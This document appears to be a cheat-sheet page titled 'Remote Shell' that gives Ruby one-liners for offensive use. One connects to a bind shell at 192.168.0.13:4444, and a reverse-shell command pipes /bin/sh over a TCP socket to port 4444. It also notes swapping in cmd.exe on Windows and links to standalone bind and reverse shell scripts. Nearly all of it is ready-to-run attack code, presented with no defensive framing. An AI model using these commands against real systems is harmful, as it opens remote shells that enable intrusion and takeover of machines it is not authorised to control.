# Remote Shell

> **Note:** For windows systems, replace the "/bin/sh" to "cmd.exe"

## Connect to Bind shell
from terminal
```ruby
ruby -rsocket -e's=TCPSocket.new("192.168.0.13",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end'
```

## Reverse shell
from terminal
```ruby
ruby -rsocket -e's=TCPSocket.open("0.0.0.0",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
```

## Bind and Reverse shell
This is an awesome implementation for standalone  [bind](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/bind.rb) and [reverse](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells/blob/master/rubyrev.rb) shells scripts written by [Hood3dRob1n](https://github.com/Hood3dRob1n/Ruby-Bind-and-Reverse-Shells) on github . The bind shell requires authentication while reverse is not.

